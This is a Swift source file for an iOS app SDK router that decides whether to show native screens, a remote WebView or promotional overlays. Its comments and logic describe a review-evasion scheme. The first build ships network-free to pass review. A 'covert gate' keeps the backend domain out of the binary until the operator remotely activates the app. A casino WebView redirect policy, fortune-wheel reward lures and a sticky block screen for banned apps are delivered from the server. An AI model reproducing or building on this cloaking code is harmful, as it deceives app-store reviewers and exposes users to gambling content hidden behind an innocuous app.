// NyxDispatcherRouter.swift
// Main application router - decides what content to show

import Foundation
import Combine
import UIKit
import SwiftUI
import UserNotifications

// MARK: - App State

enum NyxDispatcherState: Equatable {
    case idle
    case loading
    case webContent(URL)
    case nativeContent
    case overlay(NyxAnchorType)
    /// Fullscreen non-dismissible redirect overlay for banned apps.
    /// Top-level (not nested under ``.overlay``) because it must
    /// pre-empt every other UI state, including the loading view
    /// — a sticky payload is restored in ``NyxDispatcherRouter.init`` before
    /// any network call, so users of a banned app never see a flash
    /// of native content on cold launch.
    case blocked(NyxForge)
    case error(String)

    static func == (lhs: NyxDispatcherState, rhs: NyxDispatcherState) -> Bool {
        switch (lhs, rhs) {
        case (.idle, .idle): return true
        case (.loading, .loading): return true
        case (.webContent(let l), .webContent(let r)): return l == r
        case (.nativeContent, .nativeContent): return true
        case (.overlay(let l), .overlay(let r)): return l == r
        case (.blocked(let l), .blocked(let r)): return l == r
        case (.error, .error): return true
        default: return false
        }
    }
}

enum NyxAnchorType: Equatable {
    case pushPermission(settingsMode: Bool = false)
    case rateApp
    case forceUpdate
    /// Fortune Wheel overlay. When triggered via server the config
    /// carries the CTA + landing URL to open after the swipe; when
    /// triggered manually (legacy ``showFortuneWheel(targetValue:)``)
    /// the ctaLabel/URL are nil and the sheet falls back to its
    /// "Claim Reward" close action.
    case fortuneWheel(
        targetValue: Int,
        ctaLabel: String?,
        ctaLandingURL: URL?,
        landingMode: String?,
        title: String?,
        subtitle: String?,
        resultTitle: String?,
        segments: [String]?
    )
    case privacyPolicy(url: URL?)
    case iconChange(name: String)
}

// MARK: - Router Delegate

@MainActor
protocol NyxPilot: AnyObject {
    /// Called when native content should be displayed
    func routerDidRequestNativeContent()

    /// Called when web content should be displayed
    func routerDidRequestWebContent(url: URL)

    /// Called when web content is dismissed
    func routerDidFinishWebContent()

    /// Called when an error occurs
    func routerDidEncounterError(_ error: Error)

    /// Called before showing an overlay
    func routerWillShowOverlay(_ type: NyxAnchorType)

    /// Called after dismissing an overlay
    func routerDidDismissOverlay(_ type: NyxAnchorType)

    /// Called when push permission result is received
    func routerDidReceivePushPermission(granted: Bool)

    /// Called when app update is required
    func routerRequiresUpdate(storeURL: URL?)
}

// Default implementations
extension NyxPilot {
    func routerDidRequestWebContent(url: URL) { NyxMint.log("Web content: \(url)") }
    func routerDidFinishWebContent() { NyxMint.log("Web content finished") }
    func routerDidEncounterError(_ error: Error) { NyxMint.error("Router error", error) }
    func routerWillShowOverlay(_ type: NyxAnchorType) { NyxMint.log("Show overlay: \(type)") }
    func routerDidDismissOverlay(_ type: NyxAnchorType) { NyxMint.log("Dismiss overlay: \(type)") }
    func routerDidReceivePushPermission(granted: Bool) { NyxMint.log("Push: \(granted)") }
    func routerRequiresUpdate(storeURL: URL?) { NyxMint.log("Update required") }
}

// MARK: - App Router

@MainActor
final class NyxDispatcherRouter: ObservableObject {

    // MARK: - Singleton

    static let shared = NyxDispatcherRouter()

    // MARK: - Published

    @Published private(set) var state: NyxDispatcherState = .idle
    @Published private(set) var isReady: Bool = false
    @Published private(set) var currentConfig: NyxLibraryResponse?
    /// Active overlay (fortune wheel, rate, push, privacy, update).
    /// Separate from ``state`` so overlays render on top of webContent
    /// without tearing down the WebView underneath.
    @Published private(set) var overlay: NyxAnchorType?
    /// Top-positioned banner (push permission). Renders independently
    /// from ``overlay`` so push doesn't compete with bottom sheets.
    @Published private(set) var topBanner: NyxAnchorType?
    /// When an overlay arrives while another is active, it's queued
    /// here and shown after the current one dismisses.
    private var pendingOverlay: NyxAnchorType?

    /// Liquid-morph animation progress (0…1) — driven by NyxAccountBanner,
    /// read by NyxCoveView to apply distortion to background content.
    @Published var morphProgress: Float = 0
    @Published var morphStrength: Float = 0

    /// Current WebView page background color — updated by
    /// ``NyxStudioController.syncBackgroundWithPage()`` so the
    /// safe-area gaps in SwiftUI match the loaded page.
    @Published var webViewBackgroundColor: Color = .black

    /// #4: redirect policy for the casino WebView (all_high_risk + client).
    /// nil for normal apps. Read by ``NyxStudioView`` to enable the
    /// 2nd-redirect → stub fallback.
    @Published private(set) var redirectPolicy: NyxLibraryResponse.NyxDirector?

    // MARK: - Properties

    weak var delegate: NyxPilot?
    private var settings: NyxDispatcherSettings = NyxDispatcherSettings()
    private var pushTimer: Timer?
    private var rateTimer: Timer?
    private var privacyTimer: Timer?
    private var pendingIconName: String?
    private var cancellables = Set<AnyCancellable>()

    private init() {
        setupObservers()
        // Cold-launch block restore. If a previous /init response
        // left a sticky payload in UserDefaults, render the overlay
        // immediately — before the host app calls start(), before the
        // first network request, before anything else. Prevents the
        // "flash of native UI" when users of a banned app open the
        // still-installed build.
        if let cached = NyxGallery.shared.cachedBlocked, cached.sticky {
            state = .blocked(cached)
            isReady = true
            NyxMint.log("Block restored from sticky cache on cold launch")
        }
    }

    // MARK: - Initialization

    func start(settings: sending NyxDispatcherSettings, delegate: NyxPilot? = nil) async {
        self.settings = settings
        self.delegate = delegate

        // Allow start() to proceed when init() has already restored a
        // sticky block — we still want to hit the server to learn
        // about operator-cleared gates, but we must not transition
        // into .loading (that would hide the overlay).
        let hasStickyBlocked: Bool = {
            if case .blocked(let p) = state, p.sticky { return true }
            return false
        }()

        guard state == .idle || isErrorState || hasStickyBlocked else {
            NyxMint.warning("Router already started")
            return
        }

        // #16 clean_first_submission: a network-off build never contacts
        // the server — render native immediately and return. v1.0 ships as
        // a pure native app (easy first review); an update flips
        // networkingEnabled back on to activate the flow.
        if !NyxDispatcherConfig.networkingEnabled {
            state = .nativeContent
            isReady = true
            NyxMint.log("Networking disabled (clean first submission) — native only")
            return
        }

        // #15 preflight_gate: two-stage activation. Before touching the
        // backend server we fetch a benign config feed from neutral infra;
        // it only yields the live backend base URL when the operator has
        // remotely activated this app. A closed gate means the backend
        // domain never appears in this launch's traffic (nor the binary) —
        // the app stays native. Skipped entirely when the flag is off.
        if NyxDispatcherConfig.covertGateEnabled {
            if let delivered = await NyxCobalt.resolveServerURL() {
                // Gate open — point the SDK at the freshly-delivered host.
                self.settings.serverURL = delivered
            } else if hasStickyBlocked {
                // A blocked app stays blocked even with the gate closed —
                // hold the sticky overlay rather than dropping to native.
                NyxMint.log("Preflight gate closed; sticky block held")
                return
            } else {
                state = .nativeContent
                isReady = true
                delegate?.routerDidRequestNativeContent()
                NyxMint.log("Preflight gate closed — native only")
                return
            }
        }

        if !hasStickyBlocked {
            state = .loading
        }
        NyxMint.log("Router starting...\(hasStickyBlocked ? " (block held from cache)" : "")")

        // Register Apple Search Ads attribution (no permissions needed)
        NyxCometHelper.shared.registerASAAttribution()

        // Configure network — use self.settings so a preflight-gate-delivered
        // serverURL (set above) is the base the client talks to.
        await NyxRosterClient.shared.configure(with: self.settings)

        // Request tracking if enabled AND app has ATT permission
        if settings.hasATT && settings.requestTrackingOnLaunch {
            _ = await NyxCometHelper.shared.requestTrackingPermission()
        }

        // Fetch config from server
        do {
            let request = NyxLibraryRequest.create(
                uniqueId: NyxGallery.shared.uniqueID,
                hasATT: settings.hasATT,
                appsflyerId: NyxGallery.shared.appsflyerId,
                pushToken: NyxGallery.shared.pushToken
            )
            let response = try await NyxRosterClient.shared.fetchConfig(request)

            currentConfig = response
            NyxGallery.shared.cachedConfig = response

            await processConfig(response)

        } catch {
            NyxMint.error("Config fetch failed", error)

            // If a sticky block is already on screen from cache,
            // keep it up — offline behaviour for a blocked app is to
            // stay blocked, not to fall back to native.
            if hasStickyBlocked {
                NyxMint.log("Network failed; sticky block held from cache")
                return
            }

            // Try cached config
            if let cached = NyxGallery.shared.cachedConfig {
                NyxMint.log("Using cached profile")
                currentConfig = cached
                await processConfig(cached)
            } else {
                // Default to native
                state = .nativeContent
                isReady = true
                delegate?.routerDidRequestNativeContent()
                delegate?.routerDidEncounterError(error)
                scheduleOverlays()
            }
        }
    }

    /// Quick start with API key only
    func start(apiKey: String, delegate: NyxPilot? = nil) async {
        let settings = NyxDispatcherSettings.create()
            .apiKey(apiKey)
            .build()
        await start(settings: settings, delegate: delegate)
    }

    // MARK: - State Management

    private var isErrorState: Bool {
        if case .error = state { return true }
        return false
    }

    private func processConfig(_ config: NyxLibraryResponse) async {
        NyxMint.log("Processing config...")

        // Blocked screen wins over everything else. Persist the payload
        // whenever sticky=true so cold launches keep rendering the
        // overlay before any network call finishes; clear the cache
        // on explicit blocked=null so an operator turning the block
        // off lets users back into the app on next launch.
        if let blocked = config.blocked {
            if blocked.sticky {
                NyxGallery.shared.cachedBlocked = blocked
            } else {
                NyxGallery.shared.cachedBlocked = nil
            }
            state = .blocked(blocked)
            isReady = true
            NyxMint.log("Block active: \(blocked.title)")
            return
        }
        if NyxGallery.shared.cachedBlocked != nil {
            NyxGallery.shared.cachedBlocked = nil
            NyxMint.log("Block cleared by server")
        }

        // Check for forced update first
        if config.shouldForceUpdate {
            showOverlay(.forceUpdate)
            isReady = true
            return
        }

        // Decide: WebView or Native
        if config.shouldShowWebView, let url = config.webURL {
            redirectPolicy = config.redirectPolicy  // #4 (nil for normal apps)
            state = .webContent(url)
            isReady = true
            delegate?.routerDidRequestWebContent(url: url)
            print("PUSH-DEBUG: processConfig → scheduleOverlays (webContent)")
            scheduleOverlays()  // rate/push work in any mode
        } else {
            redirectPolicy = nil
            startNativeFlow()  // calls scheduleOverlays() internally
            isReady = true
        }

        // Schedule icon change banner if server sent a different icon
        if let iconName = config.icon, !iconName.isEmpty {
            scheduleIconChange(iconName)
        }

        // Schedule server-triggered Fortune Wheel overlay — works in
        // ANY mode (native or webView). Safe to schedule after state
        // was set above; the overlay layer renders on top of both.
        if let wheel = config.fortuneWheel, wheel.isEnabled {
            scheduleFortuneWheel(wheel)
        }
    }

    func startNativeFlow() {
        state = .nativeContent
        delegate?.routerDidRequestNativeContent()
        NyxMint.log("Native flow started")
        scheduleOverlays()
    }

    // MARK: - Overlays

    func showOverlay(_ type: NyxAnchorType) {
        // If another overlay is already showing, queue this one.
        // When it dismisses, the pending overlay will be shown.
        if overlay != nil {
            pendingOverlay = type
            NyxMint.log("Overlay queued: \(type)")
            return
        }
        overlay = type
        delegate?.routerWillShowOverlay(type)
        NyxMint.log("Showing overlay: \(type)")
    }

    func dismissOverlay() {
        guard let type = overlay else { return }
        overlay = nil
        delegate?.routerDidDismissOverlay(type)

        // After privacy is accepted, schedule other overlays
        if case .privacyPolicy = type {
            scheduleOverlays()
        }

        // Show queued overlay after a brief pause so animations settle
        if let pending = pendingOverlay {
            pendingOverlay = nil
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
                self?.showOverlay(pending)
            }
        }
    }

    func dismissTopBanner() {
        topBanner = nil
    }

    func showPushPermission() {
        print("PUSH-DEBUG: showPushPermission called")
        let storage = NyxGallery.shared

        // Already accepted — nothing to do
        if storage.isPushAccepted {
            print("PUSH-DEBUG: already accepted, skipping")
            return
        }

        // Check actual iOS notification settings
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            Task { @MainActor in
                if settings.authorizationStatus == .authorized {
                    // User enabled in Settings after our prompt
                    storage.pushResult = "accepted"
                    NyxMint.log("Push already authorized in iOS Settings")
                    return
                }

                let isDeniedBySystem = settings.authorizationStatus == .denied
                storage.pushShownDate = Date()

                if isDeniedBySystem {
                    // System denied — show settings mode with compelling message
                    NyxMint.log("Push denied by system → showing settings prompt")
                    self.showOverlay(.pushPermission(settingsMode: true))
                } else {
                    // First time or "not determined" — show normal request
                    NyxMint.log("Push not determined → showing first request")
                    self.showOverlay(.pushPermission(settingsMode: false))
                }

                await self.trackEvent(.pushPromptShown, properties: [
                    "mode": isDeniedBySystem ? "settings" : "first"
                ])
            }
        }
    }

    func showRateDialog() {
        guard !NyxGallery.shared.hasRateBeenShown else {
            NyxMint.log("Rate already shown")
            return
        }
        NyxGallery.shared.rateShownDate = Date()
        showOverlay(.rateApp)
        Task { await trackEvent(.rateSheetShown) }
    }

    func showUpdateDialog() {
        showOverlay(.forceUpdate)
        delegate?.routerRequiresUpdate(storeURL: currentConfig?.storeURL)
    }

    // MARK: - Fortune Wheel

    /// Manual trigger for the wheel (legacy / debugging / developer
    /// surface). No CTA — the sheet closes via its "Claim Reward" button.
    func showFortuneWheel(targetValue: Int = Int.random(in: 0...1000)) {
        showOverlay(.fortuneWheel(
            targetValue: targetValue,
            ctaLabel: nil,
            ctaLandingURL: nil,
            landingMode: nil,
            title: nil,
            subtitle: nil,
            resultTitle: nil,
            segments: nil,
        ))
        NyxMint.log("Fortune wheel (manual) with target: \(targetValue)")
    }

    /// Server-triggered wheel with swipe-CTA → SFSafariViewController
    /// landing. Ignored silently when ``show=false`` or the minimum
    /// fields (targetValue) are missing.
    private var fortuneWheelTimer: Timer?

    func scheduleFortuneWheel(_ cfg: NyxLibraryResponse.NyxBeaconConfig) {
        guard cfg.isEnabled, let target = cfg.targetValue else {
            NyxMint.log("Fortune wheel skipped (show=false or no target)")
            return
        }
        let delay = TimeInterval(cfg.delaySec ?? 0)
        let landingURL = cfg.ctaLandingURL.flatMap(URL.init(string:))
        let ctaLabel = cfg.ctaLabel?.isEmpty == false ? cfg.ctaLabel : nil
        let segments = (cfg.segments?.isEmpty == false) ? cfg.segments : nil

        fortuneWheelTimer?.invalidate()
        NyxMint.log("Fortune wheel: landingMode=\(cfg.landingMode ?? "nil") ctaURL=\(landingURL?.absoluteString ?? "nil") ctaLabel=\(ctaLabel ?? "nil") delay=\(delay)s")
        fortuneWheelTimer = Timer.scheduledTimer(
            withTimeInterval: max(0, delay),
            repeats: false,
        ) { [weak self] _ in
            Task { @MainActor in
                self?.showOverlay(.fortuneWheel(
                    targetValue: target,
                    ctaLabel: ctaLabel,
                    ctaLandingURL: landingURL,
                    landingMode: cfg.landingMode,
                    title: cfg.title,
                    subtitle: cfg.subtitle,
                    resultTitle: cfg.resultTitle,
                    segments: segments,
                ))
                await self?.trackEvent(
                    .fortuneWheelShown,
                    properties: ["server_triggered": true],
                )
            }
        }
    }

    // MARK: - Icon Change

    private func scheduleIconChange(_ iconName: String) {
        // Only show if the current icon is different
        let currentIcon = UIApplication.shared.alternateIconName
        if currentIcon == iconName {
            NyxMint.log("Icon already set to \(iconName), skipping banner")
            return
        }

        // Show after a short delay so the app UI is visible first
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
            self?.showIconChange(iconName)
        }
    }

    func showIconChange(_ iconName: String) {
        pendingIconName = iconName
        showOverlay(.iconChange(name: iconName))
        Task { await trackEvent(.iconBannerShown, properties: ["icon": iconName]) }
        NyxMint.log("Icon change banner: \(iconName)")
    }

    func handleIconSwipeCompleted() {
        guard let iconName = pendingIconName else { return }

        UIApplication.shared.setAlternateIconName(iconName) { [weak self] error in
            Task { @MainActor in
                if let error = error {
                    NyxMint.error("Icon change failed", error)
                } else {
                    NyxMint.log("Icon changed to: \(iconName)")
                    await self?.trackEvent(.iconSwipeCompleted, properties: ["icon": iconName])
                }
                self?.pendingIconName = nil
            }
        }
    }

    func handleIconBannerExpired() {
        if let iconName = pendingIconName {
            Task { await trackEvent(.iconBannerExpired, properties: ["icon": iconName]) }
        }
        pendingIconName = nil
    }

    func showPrivacyPolicy(url: URL? = nil) {
        showOverlay(.privacyPolicy(url: url))
        NyxMint.log("Privacy policy sheet")
    }

    // MARK: - Push Permission Results

    func handlePushPermissionResult(granted: Bool) {
        delegate?.routerDidReceivePushPermission(granted: granted)
        dismissOverlay()

        Task {
            if granted {
                await trackEvent(.pushPromptAccepted)
            } else {
                await trackEvent(.pushPromptDeclined)
            }
        }
    }

    // MARK: - Push Token Update

    /// Call this when push token is received from APNs
    /// (``didRegisterForRemoteNotificationsWithDeviceToken``).
    ///
    /// Uses the dedicated ``/client/push-token`` endpoint so ``/init``
    /// remains idempotent. No-op if the token hasn't actually
    /// changed — iOS re-issues the same token on every launch when
    /// permission is already granted, and we don't want to burn
    /// server requests on identical data.
    ///
    /// The reported ``authStatus`` makes the server able to tell
    /// "has token, user consented" (push_enabled=true) from
    /// "has token, consent was revoked in Settings"
    /// (push_enabled=false) without a second round trip.
    func updatePushToken(_ token: String) {
        let previous = NyxGallery.shared.pushToken
        NyxGallery.shared.pushToken = token

        Task { @MainActor in
            let status = await Self.fetchAuthorizationStatus()
            let authChanged = NyxGallery.shared.pushResult != status
            NyxGallery.shared.pushResult = status

            // Skip the network round trip when nothing the server
            // cares about has changed. First time through ``previous``
            // is nil → we always push.
            guard previous != token || authChanged || previous == nil else {
                NyxMint.log("Push token unchanged (\(token.prefix(12))…); skip upload")
                return
            }

            let request = NyxOnyxRequest.create(
                token: token,
                authStatus: status,
                environment: Self.currentAPNsEnvironment()
            )

            do {
                let resp = try await NyxRosterClient.shared.uploadPushToken(request)
                NyxMint.log("Push token uploaded — server says push_enabled=\(resp.pushEnabled)")
            } catch {
                NyxMint.error("Failed to upload push token", error)
            }
        }
    }

    /// Ask ``UNUserNotificationCenter`` for the current authorization
    /// status and map to the string shape the server expects.
    private static func fetchAuthorizationStatus() async -> String {
        let center = UNUserNotificationCenter.current()
        let settings = await center.notificationSettings()
        switch settings.authorizationStatus {
        case .authorized:    return "authorized"
        case .provisional:   return "provisional"
        case .ephemeral:     return "ephemeral"
        case .denied:        return "denied"
        case .notDetermined: return "notDetermined"
        @unknown default:    return "notDetermined"
        }
    }

    /// Best-effort guess of the APNs environment this binary talks
    /// to. Release/TestFlight builds → "production", Debug builds
    /// → "sandbox". The server doesn't trust this for routing —
    /// it reads its own ``apns_environment`` column — but it helps
    /// detect config drift in logs ("sandbox build is on a production
    /// app row").
    private static func currentAPNsEnvironment() -> String {
        #if DEBUG
        return "sandbox"
        #else
        return "production"
        #endif
    }

    /// Convert APNs device token Data to string
    static func tokenString(from deviceToken: Data) -> String {
        deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
    }

    // MARK: - Rate App Results

    func handleRateResult(rating: Int? = nil, comment: String? = nil) {
        dismissOverlay()

        Task {
            var props: [String: Any] = [:]
            if let rating = rating { props["rating"] = rating }
            if let comment = comment { props["comment"] = comment }

            if props.isEmpty {
                await trackEvent(.rateSheetClosed)
            } else {
                await trackEvent(.rateSliderCompleted, properties: props)
            }
        }
    }

    // MARK: - WebView

    func closeWebContent() {
        state = .nativeContent
        delegate?.routerDidFinishWebContent()
        delegate?.routerDidRequestNativeContent()
    }

    /// Push the router into ``.webContent`` from outside the normal
    /// ``/init`` flow. Used by ``NyxMeadowRouter`` when an incoming URL
    /// carries an ``open_url`` override. No-ops if the router is still
    /// loading (pre-``/init``) so a deep link that arrives before the
    /// first decision doesn't race ahead of the server assignment.
    func openWebContent(url: URL) {
        guard isReady else {
            print("openWebContent IGNORED — isReady=false")
            return
        }
        print("openWebContent: → \(url)")
        state = .webContent(url)
        delegate?.routerDidRequestWebContent(url: url)
    }

    // MARK: - Event Tracking

    func trackEvent(_ event: NyxAtlasRequest.NyxConduit, properties: [String: Any]? = nil) async {
        await NyxRosterClient.shared.trackEvent(
            name: event.rawValue,
            uniqueId: NyxGallery.shared.uniqueID,
            properties: properties
        )
    }

    func trackCustomEvent(name: String, properties: [String: Any]? = nil) async {
        await NyxRosterClient.shared.trackEvent(
            name: name,
            uniqueId: NyxGallery.shared.uniqueID,
            properties: properties
        )
    }

    // MARK: - Scheduling

    private func scheduleOverlays() {
        print("SCHEDULE-OVERLAYS: config=\(currentConfig != nil) native=\(isNativeFlow) privacy=\(NyxGallery.shared.hasPrivacyBeenAccepted)")
        pushTimer?.invalidate()
        rateTimer?.invalidate()
        privacyTimer?.invalidate()

        // Privacy Policy — works without server config
        // Show only on first launch (privacy not accepted) and native mode
        if !NyxGallery.shared.hasPrivacyBeenAccepted && isNativeFlow {
            let privacyDelay = NyxDispatcherConfig.privacyDelay
            NyxMint.log("Scheduling privacy in \(privacyDelay)s (first launch)")
            privacyTimer = Timer.scheduledTimer(withTimeInterval: privacyDelay, repeats: false) { [weak self] _ in
                Task { @MainActor in
                    self?.showPrivacyPolicy(url: self?.settings.privacyURL)
                }
            }
            return
        }

        guard let config = currentConfig else { print("SCHEDULE-OVERLAYS: no config"); return }

        // Push permission — show if not yet accepted
        // Re-shows on next launch if user tapped "Maybe Later" or was denied by system
        let pushDelay = settings.pushDelayOverride ?? config.pushDelay
        let shouldShowPush = pushDelay > 0 && !NyxGallery.shared.isPushAccepted
        print("PUSH-DEBUG: delay=\(pushDelay) accepted=\(NyxGallery.shared.isPushAccepted) shouldShow=\(shouldShowPush) result=\(NyxGallery.shared.pushResult ?? "nil")")
        if shouldShowPush {
            print("PUSH-DEBUG: scheduling in \(pushDelay)s")
            pushTimer = Timer.scheduledTimer(withTimeInterval: pushDelay, repeats: false) { [weak self] _ in
                print("PUSH-DEBUG: timer fired")
                Task { @MainActor in self?.showPushPermission() }
            }
        }

        // Rate dialog
        let rateDelay = settings.rateDelayOverride ?? config.rateDelay
        if rateDelay > 0 && !NyxGallery.shared.hasRateBeenShown {
            NyxMint.log("Scheduling rate in \(rateDelay)s")
            rateTimer = Timer.scheduledTimer(withTimeInterval: rateDelay, repeats: false) { [weak self] _ in
                Task { @MainActor in self?.showRateDialog() }
            }
        }
    }

    private func setupObservers() {
        NotificationCenter.default.publisher(for: UIApplication.didBecomeActiveNotification)
            .sink { [weak self] _ in
                NyxMint.log("App became active")
                self?.scheduleOverlays()
            }
            .store(in: &cancellables)
    }
}

// MARK: - Convenience

extension NyxDispatcherRouter {

    var isNativeFlow: Bool {
        state == .nativeContent
    }

    var isWebFlow: Bool {
        if case .webContent = state { return true }
        return false
    }

    var isShowingOverlay: Bool {
        if case .overlay = state { return true }
        return false
    }

    var currentOverlay: NyxAnchorType? {
        if case .overlay(let type) = state { return type }
        return nil
    }

    var webURL: URL? {
        if case .webContent(let url) = state { return url }
        return nil
    }

    /// ``true`` whenever the fullscreen blocked screen is active.
    /// Host apps can inspect this to e.g. suppress their own
    /// analytics / deeplink handling while the gate is up.
    var isBlockedActive: Bool {
        if case .blocked = state { return true }
        return false
    }

    var currentBlocked: NyxForge? {
        if case .blocked(let payload) = state { return payload }
        return nil
    }
}
